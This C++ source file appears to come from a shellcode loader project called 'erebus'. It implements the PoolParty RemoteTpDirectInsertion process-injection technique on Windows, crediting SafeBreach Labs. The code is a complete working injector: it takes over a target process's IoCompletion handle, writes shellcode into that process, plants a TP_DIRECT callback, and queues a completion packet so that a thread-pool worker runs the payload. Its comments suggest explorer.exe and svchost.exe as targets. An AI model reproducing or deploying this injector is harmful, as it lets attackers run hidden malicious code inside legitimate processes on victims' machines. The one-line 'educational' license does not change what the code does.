/**
 * @file injection_poolparty.cpp
 * @brief PoolParty Process Injection Technique
 * 
 * Implementation based on SafeBreach-Labs PoolParty research:
 * https://github.com/SafeBreach-Labs/PoolParty
 * 
 * Credits:
 *   - SafeBreach Labs (https://safebreach.com/)
 *   - Alon Leviev (@_0xDeku)
 *   - Original research: "PoolParty - A New Set of Windows Thread Pool Injection Techniques"
 *   - Presented at Black Hat Europe 2023
 * 
 * This implementation uses the RemoteTpDirectInsertion variant which:
 *   1. Hijacks the target process's IoCompletion handle
 *   2. Writes shellcode to target process
 *   3. Creates a TP_DIRECT structure pointing to shellcode
 *   4. Queues packet to IoCompletion port via ZwSetIoCompletion
 *   5. Worker thread dequeues and executes the callback
 * 
 * IMPORTANT: Target Process Requirements
 * =======================================
 * This variant requires the target process to have an EXISTING Windows Thread Pool
 * with an IoCompletion handle. Simple applications like notepad.exe may not have this.
 * 
 * Suitable targets include:
 *   - Processes using async I/O (thread pools): explorer.exe, svchost.exe
 *   - Applications with background workers: browsers, media players
 *   - Any process that has initialized TpAllocPool() or uses QueueUserWorkItem()
 * 
 * For newly spawned processes, the thread pool may take time to initialize (if at all).
 * The implementation includes a retry mechanism to wait for initialization.
 * 
 * License: This code is provided for educational and authorized security testing only.
 */

#include "../include/loader.hpp"

namespace erebus {
#if CONFIG_INJECTION_TYPE == 5

	// ====================
	// POOLPARTY STRUCTURES
	// ====================

	// Worker Factory access rights
	#ifndef WORKER_FACTORY_RELEASE_WORKER
	#define WORKER_FACTORY_RELEASE_WORKER       0x0001
	#define WORKER_FACTORY_WAIT                 0x0002
	#define WORKER_FACTORY_SET_INFORMATION      0x0004
	#define WORKER_FACTORY_QUERY_INFORMATION    0x0008
	#define WORKER_FACTORY_READY_WORKER         0x0010
	#define WORKER_FACTORY_SHUTDOWN             0x0020
	#endif

	#ifndef IO_COMPLETION_ALL_ACCESS
	#define IO_COMPLETION_ALL_ACCESS            0x001F0003
	#endif

	// Worker Factory Basic Information structure
	typedef struct _PP_WORKER_FACTORY_BASIC_INFORMATION {
		LARGE_INTEGER Timeout;
		LARGE_INTEGER RetryTimeout;
		LARGE_INTEGER IdleTimeout;
		BOOLEAN Paused;
		BOOLEAN TimerSet;
		BOOLEAN QueuedToExWorker;
		BOOLEAN MayCreate;
		BOOLEAN CreateInProgress;
		BOOLEAN InsertedIntoQueue;
		BOOLEAN Shutdown;
		ULONG BindingCount;
		ULONG ThreadMinimum;
		ULONG ThreadMaximum;
		ULONG PendingWorkerCount;
		ULONG WaitingWorkerCount;
		ULONG TotalWorkerCount;
		ULONG ReleaseCount;
		LONGLONG InfiniteWaitGoal;
		PVOID StartRoutine;
		PVOID StartParameter;
		HANDLE ProcessId;
		SIZE_T StackReserve;
		SIZE_T StackCommit;
		NTSTATUS LastThreadCreationStatus;
	} PP_WORKER_FACTORY_BASIC_INFORMATION, *PPP_WORKER_FACTORY_BASIC_INFORMATION;

	// Process handle table entry info
	typedef struct _PP_PROCESS_HANDLE_TABLE_ENTRY_INFO {
		HANDLE HandleValue;
		ULONG_PTR HandleCount;
		ULONG_PTR PointerCount;
		ACCESS_MASK GrantedAccess;
		ULONG ObjectTypeIndex;
		ULONG HandleAttributes;
		ULONG Reserved;
	} PP_PROCESS_HANDLE_TABLE_ENTRY_INFO, *PPP_PROCESS_HANDLE_TABLE_ENTRY_INFO;

	// Process handle snapshot information
	typedef struct _PP_PROCESS_HANDLE_SNAPSHOT_INFORMATION {
		ULONG_PTR NumberOfHandles;
		ULONG_PTR Reserved;
		PP_PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[1];
	} PP_PROCESS_HANDLE_SNAPSHOT_INFORMATION, *PPP_PROCESS_HANDLE_SNAPSHOT_INFORMATION;

	// Public object type information
	typedef struct _PP_PUBLIC_OBJECT_TYPE_INFORMATION {
		UNICODE_STRING TypeName;
		ULONG Reserved[22];
	} PP_PUBLIC_OBJECT_TYPE_INFORMATION, *PPP_PUBLIC_OBJECT_TYPE_INFORMATION;

	// TP_TASK structure
	typedef struct _PP_TP_TASK {
		PVOID Callbacks;
		UINT32 NumaNode;
		UINT8 IdealProcessor;
		char Padding[3];
		LIST_ENTRY ListEntry;
	} PP_TP_TASK, *PPP_TP_TASK;

	// TP_DIRECT structure - the key structure for this technique
	typedef struct _PP_TP_DIRECT {
		PP_TP_TASK Task;
		UINT64 Lock;
		LIST_ENTRY IoCompletionInformationList;
		PVOID Callback;
		UINT32 NumaNode;
		UINT8 IdealProcessor;
		char Padding[3];
	} PP_TP_DIRECT, *PPP_TP_DIRECT;

	// ============================================
	// NT API TYPEDEFS
	// ============================================

	typedef NTSTATUS(NTAPI* typeNtQueryInformationWorkerFactory)(
		_In_ HANDLE WorkerFactoryHandle,
		_In_ ULONG WorkerFactoryInformationClass,
		_Out_ PVOID WorkerFactoryInformation,
		_In_ ULONG WorkerFactoryInformationLength,
		_Out_opt_ PULONG ReturnLength
	);

	typedef NTSTATUS(NTAPI* typeNtSetInformationWorkerFactory)(
		_In_ HANDLE WorkerFactoryHandle,
		_In_ ULONG WorkerFactoryInformationClass,
		_In_ PVOID WorkerFactoryInformation,
		_In_ ULONG WorkerFactoryInformationLength
	);

	typedef NTSTATUS(NTAPI* typeNtQueryObject)(
		_In_opt_ HANDLE Handle,
		_In_ ULONG ObjectInformationClass,
		_Out_opt_ PVOID ObjectInformation,
		_In_ ULONG ObjectInformationLength,
		_Out_opt_ PULONG ReturnLength
	);

	typedef NTSTATUS(NTAPI* typeNtDuplicateObject)(
		_In_ HANDLE SourceProcessHandle,
		_In_ HANDLE SourceHandle,
		_In_opt_ HANDLE TargetProcessHandle,
		_Out_opt_ PHANDLE TargetHandle,
		_In_ ACCESS_MASK DesiredAccess,
		_In_ ULONG HandleAttributes,
		_In_ ULONG Options
	);

	typedef NTSTATUS(NTAPI* typeZwSetIoCompletion)(
		_In_ HANDLE IoCompletionHandle,
		_In_opt_ PVOID KeyContext,
		_In_opt_ PVOID ApcContext,
		_In_ NTSTATUS IoStatus,
		_In_ ULONG_PTR IoStatusInformation
	);

	// ================
	// HELPER FUNCTIONS
	// ================

	/**
	 * @brief Hijacks a handle of specified type from target process
	 * @param hTargetProcess Handle to target process
	 * @param wsObjectType Object type name (L"TpWorkerFactory" or L"IoCompletion")
	 * @param dwDesiredAccess Desired access for duplicated handle
	 * @return Duplicated handle, or NULL on failure
	 * 
	 * Based on SafeBreach-Labs HandleHijacker implementation
	 */
	static HANDLE HijackProcessHandle(
		IN HANDLE hTargetProcess,
		IN const wchar_t* wsObjectType,
		IN DWORD dwDesiredAccess)
	{
		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (!ntdll) {
			LOG_ERROR("Failed to get ntdll.dll handle");
			return NULL;
		}
		
		typeNtQueryInformationProcess NtQueryInformationProcess = 
			(typeNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
		typeNtQueryObject NtQueryObject = 
			(typeNtQueryObject)GetProcAddress(ntdll, "NtQueryObject");
		typeNtDuplicateObject NtDuplicateObject = 
			(typeNtDuplicateObject)GetProcAddress(ntdll, "NtDuplicateObject");

		if (!NtQueryInformationProcess || !NtQueryObject || !NtDuplicateObject) {
			LOG_ERROR("Failed to resolve NT functions in HijackProcessHandle");
			return NULL;
		}

		// Query process handle information
		ULONG bufferSize = 0x10000;
		PVOID buffer = NULL;
		NTSTATUS status;
		ULONG returnLength = 0;

		do {
			if (buffer) free(buffer);
			buffer = malloc(bufferSize);
			if (!buffer) {
				LOG_ERROR("Failed to allocate buffer for handle query");
				return NULL;
			}

			status = NtQueryInformationProcess(
				hTargetProcess,
				(PROCESSINFOCLASS)ProcessHandleInformation,
				buffer,
				bufferSize,
				&returnLength
			);

			if (status == STATUS_INFO_LENGTH_MISMATCH) {
				bufferSize = returnLength + 0x1000;
			}
		} while (status == STATUS_INFO_LENGTH_MISMATCH);

		if (!NT_SUCCESS(status)) {
			LOG_ERROR("NtQueryInformationProcess failed: 0x%08lX", status);
			free(buffer);
			return NULL;
		}

		PPP_PROCESS_HANDLE_SNAPSHOT_INFORMATION handleInfo = 
			(PPP_PROCESS_HANDLE_SNAPSHOT_INFORMATION)buffer;

		// Iterate through handles to find matching type
		for (ULONG_PTR i = 0; i < handleInfo->NumberOfHandles; i++) {
			HANDLE hDuplicated = NULL;
			
			// Duplicate handle to our process
			status = NtDuplicateObject(
				hTargetProcess,
				handleInfo->Handles[i].HandleValue,
				GetCurrentProcess(),
				&hDuplicated,
				dwDesiredAccess,
				0,
				0
			);

			if (!NT_SUCCESS(status) || hDuplicated == NULL) {
				continue;
			}

			// Query object type - allocate buffer for struct + type name string
			BYTE typeInfoBuffer[512] = { 0 };
			status = NtQueryObject(
				hDuplicated,
				2, // ObjectTypeInformation
				typeInfoBuffer,
				sizeof(typeInfoBuffer),
				NULL
			);

			if (!NT_SUCCESS(status)) {
				CloseHandle(hDuplicated);
				continue;
			}

			PPP_PUBLIC_OBJECT_TYPE_INFORMATION typeInfo = (PPP_PUBLIC_OBJECT_TYPE_INFORMATION)typeInfoBuffer;

			// Compare type name
			if (typeInfo->TypeName.Buffer && 
				wcscmp(typeInfo->TypeName.Buffer, wsObjectType) == 0) {
				LOG_SUCCESS("Found %ls handle: 0x%p", wsObjectType, hDuplicated);
				free(buffer);
				return hDuplicated;
			}

			CloseHandle(hDuplicated);
		}

		// Handle not found - caller will retry or report error
		free(buffer);
		return NULL;
	}

	/**
	 * @brief Hijacks IoCompletion handle from target process
	 * Used for PoolParty RemoteTpDirectInsertion variant
	 */
	static HANDLE HijackIoCompletionHandle(IN HANDLE hTargetProcess) {
		return HijackProcessHandle(hTargetProcess, L"IoCompletion", IO_COMPLETION_ALL_ACCESS);
	}

	/**
	 * @brief Hijacks TpWorkerFactory handle from target process
	 * Used for PoolParty WorkerFactoryStartRoutineOverwrite variant
	 */
	static HANDLE HijackWorkerFactoryHandle(IN HANDLE hTargetProcess) {
		return HijackProcessHandle(hTargetProcess, L"TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS);
	}

	/**
	 * @brief Check if a process has an active thread pool (IoCompletion handle)
	 * Used to validate target before injection
	 * @param hProcess Handle to target process
	 * @return TRUE if thread pool exists, FALSE otherwise
	 */
	BOOL ProcessHasThreadPool(IN HANDLE hProcess) {
		HANDLE hIoCompletion = HijackProcessHandle(hProcess, L"IoCompletion", IO_COMPLETION_ALL_ACCESS);
		if (hIoCompletion != NULL) {
			CloseHandle(hIoCompletion);
			return TRUE;
		}
		return FALSE;
	}

	// ============================================
	// POOLPARTY INJECTION - RemoteTpDirectInsertion
	// ============================================
	/**
	 * @brief PoolParty injection using RemoteTpDirectInsertion variant
	 * 
	 * This technique:
	 * 1. Hijacks the target's IoCompletion port handle
	 * 2. Writes shellcode to target process
	 * 3. Creates TP_DIRECT structure with shellcode as callback
	 * 4. Allocates TP_DIRECT in target process
	 * 5. Queues completion packet via ZwSetIoCompletion
	 * 6. Thread pool worker dequeues and executes callback
	 * 
	 * @param shellcode Shellcode buffer
	 * @param shellcode_size Size of shellcode
	 * @param hProcess Handle to target process
	 * @param hThread Handle to target thread (unused in this variant)
	 */
	VOID InjectionPoolParty(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
	{
		LOG_INFO("========================================");
		LOG_INFO("PoolParty Injection (RemoteTpDirectInsertion)");
		LOG_INFO("========================================");
		LOG_INFO("Credits: SafeBreach Labs - https://github.com/SafeBreach-Labs/PoolParty");

		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (!ntdll) {
			LOG_ERROR("Failed to get ntdll.dll module handle");
			return;
		}

		typeNtResumeThread NtResumeThread = (typeNtResumeThread)GetProcAddress(ntdll, "NtResumeThread");
		typeNtClose NtClose = (typeNtClose)GetProcAddress(ntdll, "NtClose");
		typeZwSetIoCompletion ZwSetIoCompletion = (typeZwSetIoCompletion)GetProcAddress(ntdll, "ZwSetIoCompletion");
		typeNtWriteVirtualMemory NtWriteVirtualMemory = (typeNtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
		typeNtAllocateVirtualMemory NtAllocateVirtualMemory = (typeNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");

		// Validate function pointers
		if (!NtResumeThread || !NtClose || !ZwSetIoCompletion || !NtWriteVirtualMemory || !NtAllocateVirtualMemory) {
			LOG_ERROR("Failed to resolve one or more NT functions");
			return;
		}

		NTSTATUS status;
		HANDLE hIoCompletion = NULL;
		PVOID shellcodeAddress = NULL;
		PVOID remoteTpDirectAddress = NULL;

		// Step 1: Resume thread first (only needed for suspended processes)
		LOG_INFO("[Step 1/5] Checking target thread...");
		if (hThread != NULL && hThread != INVALID_HANDLE_VALUE && (ULONG_PTR)hThread > 1) {
			ULONG suspendCount = 0;
			status = NtResumeThread(hThread, &suspendCount);
			if (!NT_SUCCESS(status)) {
				LOG_INFO("Thread not suspended or already running");
			} else {
				LOG_SUCCESS("Thread resumed (previous suspend count: %lu)", suspendCount);
			}
		} else {
			LOG_INFO("Targeting existing process - thread already running");
		}

		// Step 2: Hijack IoCompletion handle from target process
		// Retry multiple times as thread pool may take time to initialize
		// NOTE: Requires Administrator privileges to enumerate handles from protected processes
		LOG_INFO("[Step 2/5] Hijacking IoCompletion handle from target process...");
		LOG_INFO("Note: If this fails, try running as Administrator");
		const int maxRetries = 10;
		const int retryDelayMs = 500;
		
		for (int attempt = 1; attempt <= maxRetries; attempt++) {
			Sleep(retryDelayMs);
			hIoCompletion = HijackIoCompletionHandle(hProcess);
			if (hIoCompletion != NULL) {
				break;
			}
			if (attempt < maxRetries) {
				LOG_INFO("Thread pool not ready, retry %d/%d...", attempt, maxRetries);
			}
		}
		
		if (hIoCompletion == NULL) {
			LOG_ERROR("Failed to hijack IoCompletion handle after %d attempts", maxRetries);
			LOG_ERROR("Target process may not have initialized its thread pool");
			LOG_INFO("Note: PoolParty requires a process with an active thread pool");
			goto cleanup;
		}
		LOG_SUCCESS("Hijacked IoCompletion handle: 0x%p", hIoCompletion);

		// Step 3: Write shellcode to target process
		LOG_INFO("[Step 3/5] Writing shellcode to target process...");
		shellcodeAddress = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
		if (shellcodeAddress == NULL) {
			LOG_ERROR("Failed to write shellcode to target process");
			goto cleanup;
		}
		LOG_SUCCESS("Shellcode written at: 0x%p", shellcodeAddress);

		// Step 4: Create and write TP_DIRECT structure to target process
		LOG_INFO("[Step 4/5] Creating TP_DIRECT structure in target process...");
		{
			// Create TP_DIRECT with callback pointing to shellcode
			PP_TP_DIRECT tpDirect = { 0 };
			tpDirect.Callback = shellcodeAddress;

			// Allocate memory for TP_DIRECT in target process
			SIZE_T tpDirectSize = sizeof(PP_TP_DIRECT);
			status = NtAllocateVirtualMemory(
				hProcess,
				&remoteTpDirectAddress,
				0,
				&tpDirectSize,
				MEM_COMMIT | MEM_RESERVE,
				PAGE_READWRITE
			);

			if (!NT_SUCCESS(status)) {
				LOG_ERROR("Failed to allocate TP_DIRECT memory (NTSTATUS: 0x%08lX)", status);
				goto cleanup;
			}

			// Write TP_DIRECT structure to target
			SIZE_T bytesWritten = 0;
			status = NtWriteVirtualMemory(
				hProcess,
				remoteTpDirectAddress,
				&tpDirect,
				sizeof(PP_TP_DIRECT),
				&bytesWritten
			);

			if (!NT_SUCCESS(status)) {
				LOG_ERROR("Failed to write TP_DIRECT (NTSTATUS: 0x%08lX)", status);
				goto cleanup;
			}

			LOG_SUCCESS("TP_DIRECT allocated at: 0x%p", remoteTpDirectAddress);
		}

		// Step 5: Queue packet to IoCompletion port
		LOG_INFO("[Step 5/5] Queuing packet to IoCompletion port...");
		status = ZwSetIoCompletion(
			hIoCompletion,
			remoteTpDirectAddress,  // KeyContext - pointer to TP_DIRECT
			NULL,                    // ApcContext
			0,                       // IoStatus
			0                        // IoStatusInformation
		);

		if (!NT_SUCCESS(status)) {
			LOG_ERROR("ZwSetIoCompletion failed (NTSTATUS: 0x%08lX)", status);
			goto cleanup;
		}

		LOG_SUCCESS("Completion packet queued successfully!");
		LOG_INFO("========================================");
		LOG_SUCCESS("PoolParty injection complete!");
		LOG_INFO("Shellcode will execute when thread pool worker dequeues the packet");
		LOG_INFO("========================================");

		// Give time for execution
		Sleep(2000);

	cleanup:
		if (hIoCompletion != NULL && hIoCompletion != INVALID_HANDLE_VALUE) {
			NtClose(hIoCompletion);
		}

		if (hThread != NULL && hThread != INVALID_HANDLE_VALUE) {
			NtClose(hThread);
		}

		if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE) {
			NtClose(hProcess);
		}

		return;
	}
#endif
} // namespace erebus
